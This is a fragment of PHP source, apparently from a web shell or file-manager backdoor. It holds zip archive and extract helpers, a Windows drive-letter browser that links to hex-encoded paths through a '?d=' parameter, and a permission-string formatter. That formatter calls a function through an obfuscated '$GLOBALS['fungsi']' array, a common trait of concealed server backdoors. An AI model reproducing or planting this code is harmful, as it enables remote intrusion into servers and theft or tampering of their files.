    if (is_file($source)) $zip->addFile($source, basename($source));
    elseif (is_dir($source)) {
        $rootPath = dirname($source) . '/';
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $name => $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($rootPath));
                $zip->addFile($filePath, $relativePath);
            }
        }
    }
    return $zip->close();
}
function extractFromZip($sourceFile, $destinationDir)
{
    if (!file_exists($sourceFile) || !is_dir($destinationDir)) return false;
    $zip = new ZipArchive;
    if ($zip->open($sourceFile) === TRUE) {
        $result = $zip->extractTo($destinationDir);
        $zip->close();
        return $result;
    }
    return false;
}
function windowsDriver()
{
    $winArr = [
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'V',
        'W',
        'X',
        'Y',
        'Z'
    ];
    foreach ($winArr as $winNum => $winVal) {
        if (is_dir($winVal . ":/")) {
            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
        }
    }
}
function fullName($value)
{
    $fileName = $value;
    if (strlen($fileName) > 30) {
        return substr($fileName, 0, 30) . "...";
    } else {
        return $value;
    }
}
function perms($file)
{
    $perms = $GLOBALS['fungsi'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket 
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link 
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular 
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special 
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory 
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special 
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe 
        $info = 'p';
    } else {
        // Unknown 
        $info = 'u';
    }
    // Owner 
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group 
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // World 
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
?>